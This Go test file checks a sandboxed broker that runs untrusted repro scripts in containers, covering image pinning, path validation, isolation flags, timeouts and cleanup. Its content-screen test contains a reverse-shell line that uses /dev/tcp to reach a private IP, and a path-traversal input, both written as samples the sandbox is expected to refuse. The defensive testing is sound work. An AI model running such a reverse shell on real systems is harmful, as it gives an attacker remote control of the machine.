// SPDX-License-Identifier: AGPL-3.0-only

package repro

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// recordedCall is one invocation the stub runner captured.
type recordedCall struct {
	stdin   []byte
	timeout time.Duration
	name    string
	args    []string
}

// stubRunner records every command and answers via a responder keyed on the
// container --name (so a test can make a specific phase fail or time out).
type stubRunner struct {
	calls     []recordedCall
	responder func(rc recordedCall) (execResult, error)
}

func (s *stubRunner) run(_ context.Context, stdin []byte, timeout time.Duration, name string, args ...string) (execResult, error) {
	s.calls = append(s.calls, recordedCall{stdin: stdin, timeout: timeout, name: name, args: args})
	if s.responder != nil {
		return s.responder(recordedCall{stdin: stdin, timeout: timeout, name: name, args: args})
	}
	return execResult{}, nil
}

// phaseName returns the value of the --name flag in a docker invocation, or "".
func (rc recordedCall) phaseName() string { return rc.flag("--name") }

// flag returns the value following the first occurrence of f in args, or "".
func (rc recordedCall) flag(f string) string {
	for i := 0; i < len(rc.args)-1; i++ {
		if rc.args[i] == f {
			return rc.args[i+1]
		}
	}
	return ""
}

// isRun reports whether this is a `docker run` of a phase whose name ends in suf.
func (rc recordedCall) isRunPhase(suf string) bool {
	return len(rc.args) > 0 && rc.args[0] == "run" && strings.HasSuffix(rc.phaseName(), suf)
}

// flagValues returns every value following flag f (for repeated flags).
func (rc recordedCall) flagValues(f string) []string {
	var out []string
	for i := 0; i < len(rc.args)-1; i++ {
		if rc.args[i] == f {
			out = append(out, rc.args[i+1])
		}
	}
	return out
}

func newTestBroker(s *stubRunner, opts ...Option) Broker {
	base := []Option{
		withRunner(s),
		WithRuntime("runsc"),
		withIDFunc(func() (string, error) { return "testid", nil }),
	}
	return NewBroker([]string{PinnedGoImage}, append(base, opts...)...)
}

func goodJob() Job {
	return Job{
		Image:   PinnedGoImage,
		Files:   map[string][]byte{"repro.sh": []byte("#!/bin/sh\nexit 0\n")},
		Prepare: []string{"go", "mod", "download"},
		Execute: []string{"sh", "/work/repro.sh"},
		Env:     map[string]string{"GOTOOLCHAIN": "local"},
	}
}

func TestRun_RejectsImageNotInAllowlist(t *testing.T) {
	s := &stubRunner{}
	b := newTestBroker(s)
	j := goodJob()
	j.Image = "evil/image@sha256:" + strings.Repeat("a", 64)
	if _, err := b.Run(context.Background(), j); err == nil {
		t.Fatal("expected error for image not in allowlist")
	}
	if len(s.calls) != 0 {
		t.Fatalf("no docker command should run for a rejected image, got %d", len(s.calls))
	}
}

func TestRun_RejectsUnpinnedImage(t *testing.T) {
	s := &stubRunner{}
	// Allowlist a tag-only image: it must still be refused for not being pinned.
	b := NewBroker([]string{"golang:1.25"}, withRunner(s), WithRuntime("runsc"),
		withIDFunc(func() (string, error) { return "x", nil }))
	j := goodJob()
	j.Image = "golang:1.25"
	if _, err := b.Run(context.Background(), j); err == nil {
		t.Fatal("expected error for non-digest-pinned image")
	}
}

func TestRun_RejectsBadInputs(t *testing.T) {
	cases := map[string]func(*Job){
		"empty execute":  func(j *Job) { j.Execute = nil },
		"no files":       func(j *Job) { j.Files = nil },
		"abs path":       func(j *Job) { j.Files = map[string][]byte{"/etc/passwd": {}} },
		"traversal":      func(j *Job) { j.Files = map[string][]byte{"../escape": {}} },
		"bad env key":    func(j *Job) { j.Env = map[string]string{"A=B": "c"} },
		"newline in key": func(j *Job) { j.Env = map[string]string{"A\nB": "c"} },
	}
	for name, mut := range cases {
		t.Run(name, func(t *testing.T) {
			s := &stubRunner{}
			b := newTestBroker(s)
			j := goodJob()
			mut(&j)
			if _, err := b.Run(context.Background(), j); err == nil {
				t.Fatalf("expected validation error for %q", name)
			}
		})
	}
}

func TestRun_PolicyHardcodedOnEveryPhase(t *testing.T) {
	s := &stubRunner{}
	b := newTestBroker(s)
	if _, err := b.Run(context.Background(), goodJob()); err != nil {
		t.Fatalf("Run: %v", err)
	}

	// Every sandboxed phase (populate, prepare, execute) must carry the full
	// isolation policy. These flags come from the broker, never the job.
	required := [][2]string{
		{"--runtime", "runsc"},
		{"--read-only", ""},
		{"--cap-drop", "ALL"},
		{"--security-opt", "no-new-privileges"},
	}
	var sawPhases int
	for _, c := range s.calls {
		if len(c.args) == 0 || c.args[0] != "run" {
			continue
		}
		sawPhases++
		joined := strings.Join(c.args, " ")
		for _, req := range required {
			if req[1] == "" {
				if !contains(c.args, req[0]) {
					t.Errorf("phase %q missing flag %s; args=%s", c.phaseName(), req[0], joined)
				}
			} else if c.flag(req[0]) != req[1] {
				t.Errorf("phase %q: %s=%q, want %q", c.phaseName(), req[0], c.flag(req[0]), req[1])
			}
		}
		if c.flag("--pids-limit") == "" {
			t.Errorf("phase %q missing --pids-limit", c.phaseName())
		}
		if c.flag("--memory") == "" {
			t.Errorf("phase %q missing --memory", c.phaseName())
		}
		// Only the named volume is mounted writable — never a host bind (exp-0004).
		for _, v := range c.flagValues("-v") {
			if !strings.HasPrefix(v, "twiceshy-repro-testid:") {
				t.Errorf("phase %q mounts %q; only the named volume is allowed", c.phaseName(), v)
			}
		}
	}
	if sawPhases != 3 {
		t.Fatalf("expected 3 run phases (populate, prepare, execute), got %d", sawPhases)
	}
}

func TestRun_ExecuteHasNoNetwork_PrepareHasBridge(t *testing.T) {
	s := &stubRunner{}
	b := newTestBroker(s)
	if _, err := b.Run(context.Background(), goodJob()); err != nil {
		t.Fatalf("Run: %v", err)
	}
	for _, c := range s.calls {
		switch {
		case c.isRunPhase("-execute"):
			if c.flag("--network") != "none" {
				t.Errorf("execute phase network=%q, want none (untrusted code must be offline)", c.flag("--network"))
			}
			if c.flag("--user") == "0:0" {
				t.Error("execute phase must not run as root")
			}
		case c.isRunPhase("-prepare"):
			// gVisor embedded DNS only works on the default bridge (exp-0016).
			if c.flag("--network") != "bridge" {
				t.Errorf("prepare phase network=%q, want bridge", c.flag("--network"))
			}
		case c.isRunPhase("-populate"):
			if c.flag("--network") != "none" {
				t.Errorf("populate phase network=%q, want none", c.flag("--network"))
			}
			if c.flag("--user") != "0:0" {
				t.Errorf("populate runs as root to chown the disk-backed volume, got %q", c.flag("--user"))
			}
		}
	}
}

func TestRun_OnlyPopulateGetsCapChown(t *testing.T) {
	s := &stubRunner{}
	b := newTestBroker(s)
	if _, err := b.Run(context.Background(), goodJob()); err != nil {
		t.Fatalf("Run: %v", err)
	}
	for _, c := range s.calls {
		if len(c.args) == 0 || c.args[0] != "run" {
			continue
		}
		adds := c.flagValues("--cap-add")
		if c.isRunPhase("-populate") {
			// Exactly CHOWN — only to chown the root-owned volume to the exec user.
			if len(adds) != 1 || adds[0] != "CHOWN" {
				t.Errorf("populate cap-add=%v, want exactly [CHOWN]", adds)
			}
		} else {
			// The untrusted execute phase (and prepare) keep ALL caps dropped.
			if len(adds) != 0 {
				t.Errorf("phase %q must not add capabilities, got %v", c.phaseName(), adds)
			}
		}
	}
}

func TestRun_MemorySwapDisabled(t *testing.T) {
	s := &stubRunner{}
	b := newTestBroker(s)
	if _, err := b.Run(context.Background(), goodJob()); err != nil {
		t.Fatalf("Run: %v", err)
	}
	for _, c := range s.calls {
		if len(c.args) == 0 || c.args[0] != "run" {
			continue
		}
		// --memory-swap must equal --memory so memory is a hard cap (no swap).
		if mem, swap := c.flag("--memory"), c.flag("--memory-swap"); mem == "" || mem != swap {
			t.Errorf("phase %q: memory=%q memory-swap=%q, want equal non-empty", c.phaseName(), mem, swap)
		}
	}
}

func TestRun_VolumeCreatedAndLabelled(t *testing.T) {
	s := &stubRunner{}
	b := newTestBroker(s)
	if _, err := b.Run(context.Background(), goodJob()); err != nil {
		t.Fatalf("Run: %v", err)
	}
	var create *recordedCall
	for i := range s.calls {
		if len(s.calls[i].args) > 1 && s.calls[i].args[0] == "volume" && s.calls[i].args[1] == "create" {
			create = &s.calls[i]
			break
		}
	}
	if create == nil {
		t.Fatal("no volume create recorded")
	}
	// The volume must be labelled so the Reaper can sweep it after a crash.
	if !contains(create.args, "label=") && create.flag("--label") != labelKey+"=testid" {
		t.Errorf("volume create must carry the run label; args=%v", create.args)
	}
}

func TestRun_RejectsOversizedFiles(t *testing.T) {
	s := &stubRunner{}
	b := newTestBroker(s)
	j := goodJob()
	j.Files = map[string][]byte{"big": make([]byte, (8<<20)+1)}
	if _, err := b.Run(context.Background(), j); err == nil {
		t.Fatal("expected error for oversized staged files")
	}
	if len(s.calls) != 0 {
		t.Fatalf("no docker command should run when files exceed the cap, got %d", len(s.calls))
	}
}

func TestRun_NoNetworkAnywhereWhenPrepareOmitted(t *testing.T) {
	s := &stubRunner{}
	b := newTestBroker(s)
	j := goodJob()
	j.Prepare = nil
	if _, err := b.Run(context.Background(), j); err != nil {
		t.Fatalf("Run: %v", err)
	}
	for _, c := range s.calls {
		if c.flag("--network") == "bridge" {
			t.Errorf("no phase may have network when prepare is omitted; %q did", c.phaseName())
		}
	}
}

func TestRun_ExitCodePropagated(t *testing.T) {
	s := &stubRunner{responder: func(rc recordedCall) (execResult, error) {
		if rc.isRunPhase("-execute") {
			return execResult{exitCode: 1, stdout: "NOT REPRODUCED"}, nil
		}
		return execResult{}, nil
	}}
	b := newTestBroker(s)
	res, err := b.Run(context.Background(), goodJob())
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if res.Execute.ExitCode != 1 {
		t.Errorf("execute exit=%d, want 1", res.Execute.ExitCode)
	}
	if res.Execute.Stdout != "NOT REPRODUCED" {
		t.Errorf("stdout=%q", res.Execute.Stdout)
	}
}

// A non-timeout runner failure (docker missing, fork failure, a cancelled
// context) returns execResult{} with exitCode 0. That MUST NOT be read as a
// passing repro — otherwise a non-execution looks green and promotes a
// quarantined record (the "promoted by execution, not by trust" invariant).
func TestRun_RunnerErrorIsNotGreen(t *testing.T) {
	s := &stubRunner{responder: func(rc recordedCall) (execResult, error) {
		if rc.isRunPhase("-execute") {
			return execResult{}, errors.New("docker: command not found")
		}
		return execResult{}, nil
	}}
	b := newTestBroker(s)
	res, err := b.Run(context.Background(), goodJob())
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if res.Execute.ExitCode == 0 {
		t.Error("execute exit=0 on a runner error — a non-execution must not look like a green repro")
	}
	if res.Execute.Stderr == "" {
		t.Error("expected the runner error surfaced in Stderr")
	}
}

func TestRun_TimeoutForcesKillAndFlags(t *testing.T) {
	s := &stubRunner{responder: func(rc recordedCall) (execResult, error) {
		if rc.isRunPhase("-execute") {
			// Return a NON-(-1) exit code so the watchdog override (broker.go:373)
			// is observable: if the override were skipped, ExitCode would stay 137.
			return execResult{timedOut: true, exitCode: 137}, context.DeadlineExceeded
		}
		// Any label sweep finds the wedged execute container.
		if len(rc.args) >= 2 && rc.args[0] == "ps" {
			return execResult{stdout: "wedgedcid\n"}, nil
		}
		return execResult{}, nil
	}}
	b := newTestBroker(s)
	// Run must SWALLOW the runner's DeadlineExceeded: the override normalizes the
	// killed CLI into a clean PhaseResult, it does not propagate the error (the
	// t.Fatalf below is that assertion).
	res, err := b.Run(context.Background(), goodJob())
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !res.Execute.TimedOut {
		t.Error("expected TimedOut on execute")
	}
	// The override (broker.go:373) forces ExitCode=-1 — overwriting the stub's 137
	// — so the revalidator reads the killed phase as broken, not as the stub's code.
	if res.Execute.ExitCode != -1 {
		t.Errorf("execute exit=%d, want forced -1 on timeout", res.Execute.ExitCode)
	}
	// The deadline error is copied into Stderr (broker.go:374-376) because the stub
	// returned empty stderr alongside a non-nil err.
	if res.Execute.Stderr != context.DeadlineExceeded.Error() {
		t.Errorf("execute stderr=%q, want the deadline error copied in", res.Execute.Stderr)
	}
	// Watchdog must sweep this run's containers by label and force-remove them,
	// not wait for the next reaper pass.
	if !sawCall(s, func(c recordedCall) bool {
		return len(c.args) >= 2 && c.args[0] == "ps" &&
			contains(c.args, "label="+labelKey+"=testid")
	}) {
		t.Error("expected a label sweep of this run's containers on timeout")
	}
	if !sawCall(s, func(c recordedCall) bool {
		return len(c.args) >= 3 && c.args[0] == "rm" && c.args[1] == "-f" && c.args[2] == "wedgedcid"
	}) {
		t.Error("expected force-kill (rm -f) of the swept timed-out container")
	}
}

// phaseTimeout (broker.go:484-489) returns Job.Timeout when set, else the broker
// default (limits.Timeout). Both branches feed the per-phase wall-clock cap that
// is part of the sandbox safety story, so both must be pinned. The assertion is
// scoped to the phase calls that route through phaseTimeout — populate, prepare,
// execute — never the volume-create/info/rm calls (those legitimately use
// limits.Timeout/healthTimeout/30s and would false-fail).
func TestRun_PhaseTimeoutHonorsJobOverrideElseLimit(t *testing.T) {
	isPhase := func(c recordedCall) bool {
		return c.isRunPhase("-populate") || c.isRunPhase("-prepare") || c.isRunPhase("-execute")
	}

	t.Run("job override wins", func(t *testing.T) {
		s := &stubRunner{}
		b := newTestBroker(s)
		j := goodJob()
		j.Timeout = 5 * time.Second
		if _, err := b.Run(context.Background(), j); err != nil {
			t.Fatalf("Run: %v", err)
		}
		var seen int
		for _, c := range s.calls {
			if !isPhase(c) {
				continue
			}
			seen++
			if c.timeout != 5*time.Second {
				t.Errorf("phase %q timeout=%v, want job override 5s", c.phaseName(), c.timeout)
			}
		}
		if seen != 3 {
			t.Fatalf("expected 3 phase calls through phaseTimeout, saw %d", seen)
		}
	})

	t.Run("falls back to limits.Timeout when unset", func(t *testing.T) {
		// A distinct, non-default value (7s, vs DefaultLimits' 3m) proves the default
		// branch reads limits.Timeout rather than a hardcoded constant.
		s := &stubRunner{}
		b := newTestBroker(s, WithLimits(Limits{
			Memory:    DefaultLimits.Memory,
			CPUs:      DefaultLimits.CPUs,
			PidsLimit: DefaultLimits.PidsLimit,
			TmpfsSize: DefaultLimits.TmpfsSize,
			Timeout:   7 * time.Second,
		}))
		j := goodJob() // Timeout unset (0) → default branch
		if _, err := b.Run(context.Background(), j); err != nil {
			t.Fatalf("Run: %v", err)
		}
		var seen int
		for _, c := range s.calls {
			if !isPhase(c) {
				continue
			}
			seen++
			if c.timeout != 7*time.Second {
				t.Errorf("phase %q timeout=%v, want limits.Timeout 7s", c.phaseName(), c.timeout)
			}
		}
		if seen != 3 {
			t.Fatalf("expected 3 phase calls through phaseTimeout, saw %d", seen)
		}
	})
}

func TestRun_CleanupAlwaysRemovesVolume(t *testing.T) {
	s := &stubRunner{responder: func(rc recordedCall) (execResult, error) {
		if rc.isRunPhase("-execute") {
			return execResult{exitCode: 7}, nil // failing repro
		}
		return execResult{}, nil
	}}
	b := newTestBroker(s)
	if _, err := b.Run(context.Background(), goodJob()); err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !sawCall(s, func(c recordedCall) bool {
		return len(c.args) >= 3 && c.args[0] == "volume" && c.args[1] == "rm" &&
			c.args[len(c.args)-1] == "twiceshy-repro-testid"
	}) {
		t.Error("expected the named volume to be removed in cleanup")
	}
}

func TestRun_PrepareFailureSkipsExecute(t *testing.T) {
	s := &stubRunner{responder: func(rc recordedCall) (execResult, error) {
		if rc.isRunPhase("-prepare") {
			return execResult{exitCode: 1}, nil
		}
		return execResult{}, nil
	}}
	b := newTestBroker(s)
	res, err := b.Run(context.Background(), goodJob())
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if res.Prepare.ExitCode != 1 {
		t.Errorf("prepare exit=%d, want 1", res.Prepare.ExitCode)
	}
	if sawCall(s, func(c recordedCall) bool { return c.isRunPhase("-execute") }) {
		t.Error("execute must not run when prepare fails")
	}
}

func TestRun_PopulateReceivesTarOnStdin(t *testing.T) {
	s := &stubRunner{}
	b := newTestBroker(s)
	if _, err := b.Run(context.Background(), goodJob()); err != nil {
		t.Fatalf("Run: %v", err)
	}
	var populate *recordedCall
	for i := range s.calls {
		if s.calls[i].isRunPhase("-populate") {
			populate = &s.calls[i]
			break
		}
	}
	if populate == nil {
		t.Fatal("no populate phase recorded")
	}
	if len(populate.stdin) == 0 {
		t.Error("populate must receive the tar stream on stdin")
	}
	// populate untars and chowns the disk-backed volume to the exec user.
	joined := strings.Join(populate.args, " ")
	if !strings.Contains(joined, "tar -xf - -C "+workDir) {
		t.Errorf("populate must untar into the work dir; args=%s", joined)
	}
	if !strings.Contains(joined, "chown -R "+execUID) {
		t.Error("populate must chown the work dir to the exec user")
	}
}

func TestReaper_SweepsContainersThenVolumes(t *testing.T) {
	s := &stubRunner{responder: func(rc recordedCall) (execResult, error) {
		if len(rc.args) >= 2 && rc.args[0] == "ps" {
			return execResult{stdout: "c1\nc2\n"}, nil
		}
		if len(rc.args) >= 2 && rc.args[0] == "volume" && rc.args[1] == "ls" {
			return execResult{stdout: "v1\n"}, nil
		}
		return execResult{}, nil
	}}
	r := &Reaper{runner: s}
	c, v, err := r.Reap(context.Background())
	if err != nil {
		t.Fatalf("Reap: %v", err)
	}
	if c != 2 || v != 1 {
		t.Fatalf("reaped containers=%d volumes=%d, want 2 and 1", c, v)
	}
	// Containers must be removed before the volume sweep.
	psIdx, volRmIdx := -1, -1
	for i, call := range s.calls {
		if call.args[0] == "ps" {
			psIdx = i
		}
		if call.args[0] == "volume" && call.args[1] == "rm" && volRmIdx == -1 {
			volRmIdx = i
		}
	}
	if psIdx == -1 || volRmIdx == -1 || psIdx > volRmIdx {
		t.Error("expected container sweep before volume sweep")
	}
}

func TestRun_RefusesHarmfulScript(t *testing.T) {
	s := &stubRunner{}
	b := newTestBroker(s)
	j := goodJob()
	// A reverse-shell sequence in the repro must be refused at the trust boundary.
	j.Files = map[string][]byte{"repro.sh": []byte("#!/bin/sh\nsh -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")}
	if _, err := b.Run(context.Background(), j); err == nil {
		t.Fatal("expected refusal of a harmful repro script")
	}
	if len(s.calls) != 0 {
		t.Fatalf("no docker work should happen for a refused script, got %d calls", len(s.calls))
	}
}

func TestRun_RefusesEmbeddedSecret(t *testing.T) {
	s := &stubRunner{}
	b := newTestBroker(s)
	j := goodJob()
	// The canonical AWS example key (gitleaks-allowlisted) still matches the
	// screen's aws-access-key shape — a secret embedded in a repro is refused.
	awsExample := "AKIA" + "IOSFODNN7EXAMPLE"
	j.Files = map[string][]byte{"repro.sh": []byte("#!/bin/sh\nexport KEY=" + awsExample + "\n")}
	if _, err := b.Run(context.Background(), j); err == nil {
		t.Fatal("expected refusal of a repro embedding a secret")
	}
	if len(s.calls) != 0 {
		t.Fatalf("no docker work should happen for a refused script, got %d calls", len(s.calls))
	}
}

func TestRun_AllowsBenignScriptWithLoopbackAndEmail(t *testing.T) {
	s := &stubRunner{}
	b := newTestBroker(s)
	j := goodJob()
	// A legitimate repro may mention loopback (Docker DNS) and an email in a
	// fixture — neither is an EXECUTION hazard, so the run must proceed.
	j.Files = map[string][]byte{"repro.sh": []byte(
		"#!/bin/sh\n# resolver at 127.0.0.11; contact dev@example.com\nexit 0\n")}
	if _, err := b.Run(context.Background(), j); err != nil {
		t.Fatalf("benign repro was refused: %v", err)
	}
	if len(s.calls) == 0 {
		t.Fatal("expected the run to proceed for a benign script")
	}
}

// Calibration: the project's real repro fixtures must NOT be falsely rejected.
func TestScreenFiles_RealFixturesPass(t *testing.T) {
	dir := filepath.Join("..", "..", "experience", "repro")
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Skipf("no repro fixtures: %v", err)
	}
	var scripts int
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		body, err := os.ReadFile(filepath.Join(dir, e.Name()))
		if err != nil {
			t.Fatalf("read %s: %v", e.Name(), err)
		}
		scripts++
		if err := screenFiles(map[string][]byte{e.Name(): body}); err != nil {
			t.Errorf("real fixture %s falsely rejected: %v", e.Name(), err)
		}
	}
	if scripts == 0 {
		t.Skip("no repro scripts found to calibrate against")
	}
}

func sawCall(s *stubRunner, pred func(recordedCall) bool) bool {
	for _, c := range s.calls {
		if pred(c) {
			return true
		}
	}
	return false
}

func contains(ss []string, want string) bool {
	for _, s := range ss {
		if s == want {
			return true
		}
	}
	return false
}
